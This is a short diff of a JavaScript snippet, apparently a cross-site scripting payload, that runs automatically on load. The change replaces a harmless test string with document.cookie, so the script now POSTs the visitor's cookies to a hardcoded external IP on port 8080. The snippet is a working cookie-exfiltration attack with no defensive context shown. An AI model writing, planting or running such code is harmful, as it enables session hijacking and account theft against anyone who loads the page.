@@ -4,7 +4,7 @@ function loadDoc() {
   alert('ready??');
   var xhttp = new XMLHttpRequest();
   xhttp.open("POST", "http://35.167.178.16:8080", true);
-  xhttp.send('data=hello digawp');
+  xhttp.send(document.cookie);
   alert('done');
 }
 loadDoc();
